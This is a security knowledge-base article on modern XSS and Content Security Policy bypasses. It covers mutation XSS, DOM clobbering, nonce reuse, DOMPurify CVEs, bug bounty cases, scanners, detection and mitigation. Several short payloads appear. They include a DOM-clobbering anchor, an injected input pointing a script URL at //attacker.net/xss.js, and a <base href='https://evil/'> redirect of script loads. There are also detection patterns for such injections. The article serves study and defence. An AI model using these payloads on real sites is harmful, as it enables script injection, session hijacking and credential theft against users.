# Modern XSS Bypass Techniques and CSP Bypass

## Summary
XSS on a mature 2025-2026 target rarely means "no encoding at all" — a
sanitizer or a CSP is usually already in place, and the interesting bug
chains combine a markup-survival trick (getting attacker content past a
sanitizer/framework) with a CSP-defeating gadget (turning that surviving
markup into real script execution despite the policy). Neither half alone
is usually enough against a hardened target. This overlaps two other KB
topics: **Prototype Pollution** (`web-security/prototype-pollution.md`)
supplies client-side gadget chains that can produce DOM XSS directly,
including by weakening a sanitizer's own internal state, and **SSTI**
(`web-security/ssti.md`) reaches the same script-execution outcome via a
server-side template engine instead.

## Root Cause
- **Sink/context confusion**: a value escaped for one HTML context (text
  node) lands in another (attribute, `<script>` block, URL) — still the
  majority of DOM XSS in client-side frameworks (React
  `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`).
- **Mutation XSS (mXSS)**: a sanitizer serializes what looks like inert
  HTML, but the *browser's own parser* re-parses that string differently
  on insertion (comment nodes, `<noscript>`, SVG/MathML foreign-content
  boundaries, CDATA handling), mutating it into something executable the
  sanitizer never actually validated.
- **DOM clobbering**: elements with `id`/`name` are addressable as named
  properties on `window`/`document`, letting attacker HTML overwrite
  global variables or config objects trusted JS reads — without ever
  needing a `<script>` tag, so it works inside injection points where a
  sanitizer/CSP blocks scripts but still allows `<a>`/`<form>`/`<img>`.
- **Client-side template injection**: user input concatenated into an
  Angular/Vue template string re-enters the framework's own
  expression-evaluation path (the classic Angular sandbox-escape family).
- **CSP left with unsafe leftovers**: `unsafe-inline`/`unsafe-eval` kept
  for a legacy vendor script, missing `object-src`/`base-uri`/`form-action`,
  or `strict-dynamic` deployed without vetting the gadget-freedom of the
  scripts it trusts.

## Attack Flow
1. Find an injection point (reflected/stored param, DOM source like
   `location.hash`/`postMessage`, or HTML injection feeding a sanitizer).
2. Determine what's blocking raw `<script>`: encoding, a sanitizer, CSP.
3. If sanitized, fuzz for an mXSS or DOM-clobbering primitive that
   survives sanitization as "safe" markup but mutates/clobbers after
   insertion.
4. If CSP is present, fingerprint it (header vs. `<meta>` — evaluated
   independently and can differ) and look for a directive gap or a gadget
   in an allowlisted/nonce-eligible script.
5. Chain the surviving-markup primitive into the CSP-defeating gadget to
   reach script execution in the victim's session.

## Exploitation
- **mXSS, CVE-2025-26791**: DOMPurify < 3.2.4 with `SAFE_FOR_TEMPLATES`
  had a flawed template-literal regex letting crafted input survive
  sanitization and mutate into executable markup on re-parse. Fixed 3.2.4.
- **DOM clobbering vs. `strict-dynamic`** (PortSwigger, "Bypassing CSP via
  DOM Clobbering"): injecting
  `<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>` where
  `<script>` is blocked but anchors aren't clobbers a property the app's
  trusted JS reads as config, flowing into a `script.src` assignment —
  since the load is made by trusted code, `strict-dynamic`'s nonce policy
  never vets it. DOMPurify's own `IN_PLACE` mode had an analogous gap
  (see Related CVEs).
- **Textarea rawtext break-out, CVE-2025-15599**: DOMPurify didn't
  validate `<textarea>` rawtext boundaries, so a crafted `</textarea>` in
  an attribute value breaks out once sanitized output lands inside a real
  `<textarea>`. Fixed 3.2.7 on 3.x; 2.x branch never patched.
- **Prototype pollution weakening a sanitizer, CVE-2024-45801**:
  DOMPurify's nesting-depth counter was itself reachable via prototype
  pollution, so polluting `Object.prototype` with the counter's key
  forces the depth check to read attacker-controlled/`NaN` values — a
  direct illustration of Prototype Pollution → XSS via breaking the
  sanitizer's own logic rather than the DOM.
- **Allowlisted-CDN script-gadget bypass, plus nonce/form-action gaps
  (real, chained case)**: portswigger.net's CSP allowed `google.com`/
  `gstatic.com` (for reCAPTCHA), which also serves AngularJS — loading it
  and using an Angular sandbox-escape directive executes JS entirely
  within the allowlist ($1,000 bounty, Feb 2024). Separately, its JS
  sourced a script URL from
  `document.querySelector("[id^='RecaptchaClientUrl-']")`, which returns
  the first DOM match regardless of who inserted it — an injected
  `<input id="RecaptchaClientUrl-" value="//attacker.net/xss.js">` hijacks
  that lookup. A third finding ($500) exploited that `default-src` doesn't
  cover form submissions, injecting a `formaction` to redirect autofilled
  credentials to an attacker origin.

## Bypass
- **`strict-dynamic` + nonce ≠ injection-proof**: it deliberately lets any
  nonce-bearing script inject further `<script>` elements that inherit
  trust without the nonce — the remaining surface is entirely "does any
  trusted script contain a bug that lets attacker data reach a
  script-creation/`eval` sink."
- **Nonces aren't secret at runtime**: browsers blank the nonce attribute
  visually in devtools, but `document.querySelector('[nonce]').nonce`
  still returns the real value — any independent script-injection
  primitive can retrieve and reuse a live nonce.
- **`base-uri` gap**: without an explicit `base-uri`, injecting
  `<base href="https://evil/">` redirects every relative script/resource
  URL to an attacker origin, bypassing even a strict `script-src`
  allowlist for relatively-referenced scripts.
- **Header vs. `<meta>` inconsistency**: an injected `<meta http-equiv=
  "Content-Security-Policy">` is evaluated independently of the
  header-delivered policy — test which one governs which directive.

## Automation
- **DOM Invader (Burp Suite)** — browser-embedded scanner instrumenting
  DOM sources/sinks live; auto-detects client-side prototype pollution and
  DOM clobbering candidates and generates a PoC chaining source → gadget
  → sink.
- **Google CSP Evaluator** (csp-evaluator.withgoogle.com,
  github.com/google/csp-evaluator) — static analysis for allowlist-bypass
  hosts, missing `object-src`/`base-uri`, and `unsafe-inline`/`unsafe-eval`;
  co-authored by Lukas Weichselbaum, who also introduced `strict-dynamic`
  into the CSP spec.
- **The DOMino Effect** (USENIX Security 2025, Liu et al., Johns Hopkins)
  — concolic execution with a "Symbolic DOM" model to automatically
  discover DOM-clobbering gadgets at scale, with end-to-end chains
  demonstrated against Jupyter/JupyterLab, HackMD.io, and Canvas LMS.
- **dalfox** — actively maintained scanner for reflected/stored/DOM XSS
  with taint-flow/AST verification of DOM sinks and built-in CSP analysis.
  XSStrike stays reflected-focused with limited recent activity; KNOXSS is
  a mature commercial blind/DOM detection service still common in bounty
  automation.

## Detection
- Log/alert on request bodies containing `<base`, duplicate `id=`/`name=`
  pairs, or DOM-property-shaped attribute values (`nodeName`, `nodeType`)
  in rich-text fields — DOM-clobbering fingerprints.
- Run CSP violation reporting (`report-to`/Reporting API) in enforcement
  mode, not left permanently `Report-Only`, and diff a target's live CSP
  against CSP Evaluator on every deploy to catch regressions before
  shipping.

## Mitigation
- **Trusted Types** (`require-trusted-types-for 'script'` +
  `trusted-types`) enforces at the DOM-sink level that any string reaching
  `innerHTML`/dangerous `setAttribute`/`eval`-family APIs pass an
  app-defined policy first — closing the sanitize-then-insert gap mXSS
  exploits. Support reached Baseline this window: Safari 26 (Sept 2025),
  Firefox (Feb 2026). Pair it with DOMPurify's `RETURN_TRUSTED_TYPE`
  output, but only if the app never mutates sanitizer output before
  insertion.
- Keep sanitizers current — CVE-2025-26791, CVE-2025-15599,
  CVE-2024-45801, and the `IN_PLACE` clobbering fix (3.4.6) show DOMPurify
  ships real security fixes on an ongoing basis, not a "fixed once" tool.
- Set `base-uri 'none'`/`'self'`, `object-src 'none'`, and `form-action
  'self'`/`'none'` explicitly on every CSP — the directives most commonly
  omitted and left uncovered by `script-src` alone. Deliver CSP via
  header, not only `<meta>`, and audit for divergence between the two.
- Prefer nonce/hash + `strict-dynamic` over domain allowlists, paired with
  a script-gadget audit of every nonce-eligible script.

## Variant Hunting
- Re-test rich-text/paste-HTML features for mXSS after any sanitizer or
  framework version bump — fixes close one parser context at a time.
- Grep client bundles for reads of bare globals never assigned anywhere in
  the same bundle — each is a DOM-clobbering gadget candidate.
- Any allowlist-based CSP naming a large public CDN/CAPTCHA/analytics
  domain should be checked against known JSONP-endpoint/AngularJS-hosting
  lists for that domain — a fast, repeatable check across every target
  sharing the dependency.

## Related CVEs
- CVE-2025-26791 — DOMPurify < 3.2.4, mXSS via `SAFE_FOR_TEMPLATES` regex
  flaw. Fixed 3.2.4.
- CVE-2025-15599 (GHSA-v8jm-5vwx-cfxm) — DOMPurify textarea-rawtext
  break-out. Fixed 3.2.7 (3.x only, 2.x never patched).
- CVE-2024-45801 — DOMPurify, prototype-pollution-reachable depth counter
  defeats bypass protection. Fixed 2.5.4 / 3.1.3.
- DOMPurify `IN_PLACE` DOM-clobbering sanitizer bypass (GitLab Advisory
  Database, CVSS 6.1) — fixed 3.4.6.
- CVE-2025-9866 — Chromium Extensions subsystem, crafted HTML bypasses
  page CSP enforcement (CVSS 8.8), fixed Chrome 140.0.7339.80.
- CVE-2024-47068 — Rollup bundler, DOM clobbering via `import.meta.url` —
  a supply-chain variant of the same root cause (fixed 4.22.4 et al.).

## Related Bug Bounty Reports
- Johan Carlsson vs. portswigger.net (Feb 2024) — CSP bypass loading
  AngularJS from allowlisted `google.com`/`gstatic.com` reCAPTCHA script
  sources plus a missing `form-action`; $1,000 + $500.
  https://hackerone.com/reports/2279346
- Voorivex Team, "A Weird CSP Bypass led to $3.5k Bounty" (Oct 2024) —
  subdomain XSS + CORS misconfiguration + `connect-src` CSP bypass
  (semicolon-encoded URL smuggled into an "add trusted site" allowlist)
  for session-cookie exfiltration and account takeover.
- Multiple GitLab-disclosed HackerOne reports document "stored XSS + CSP
  bypass" as a recurring chain shape on that one program.

## Related Research
- PortSwigger Research — "Bypassing CSP via DOM Clobbering", "Hunting
  nonce-based CSP bypasses with dynamic analysis", and "Using form
  hijacking to bypass CSP" (Gareth Heyes / PortSwigger) — source of the
  three chained bypass techniques detailed above.
- DOMPurify Wiki, "Attack Classes & Bypass History" — living catalogue of
  mXSS/sanitizer-bypass classes by parser context.
- USENIX Security 2025 — "The DOMino Effect: Detecting and Exploiting DOM
  Clobbering Gadgets via Concolic Execution with Symbolic DOM" (Liu et
  al., Johns Hopkins) — first automated, at-scale DOM-clobbering gadget
  discovery tool.

## Practical Hunting Tips
- When a sanitizer blocks the obvious payload, check its live issue
  tracker/Attack-Classes wiki for currently unpatched or recently-patched
  parser-context gaps rather than relying on memorized bypass strings —
  this bug class is version-specific and moves fast.
- For `strict-dynamic` + nonce policies, stop trying allowlist bypasses
  and audit the nonce-eligible JS itself for selector-driven script-URL
  or `eval`-family sinks.
- Test `object-src` and `base-uri` independently of `script-src` — the two
  directives most often left permissive by default.

## Real World Examples
- portswigger.net CSP bypass (Johan Carlsson, Feb 2024): allowlisted
  Google reCAPTCHA script sources abused to load AngularJS and execute
  arbitrary JS via a sandbox-escape directive, plus a missing
  `form-action` in the same review — a security vendor's own production
  CSP carrying both bypass classes documented here.
- DOMPurify's three independent 2024-2025 sanitizer-bypass CVEs (see
  Related CVEs) against one widely-deployed library within ~12 months
  show "we use DOMPurify" isn't a closed finding without checking the
  deployed version against the current Attack Classes wiki.

## References
- https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- https://github.com/advisories/GHSA-vhxf-7vqr-mrjg (CVE-2025-26791)
- https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
- https://portswigger.net/research/using-form-hijacking-to-bypass-csp
- https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
- https://www.usenix.org/conference/usenixsecurity25/presentation/liu-zhengyu
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for
- https://advisories.gitlab.com/npm/dompurify/CVE-2026-49459/

---
*Added 2026-09-04 via research pass.*
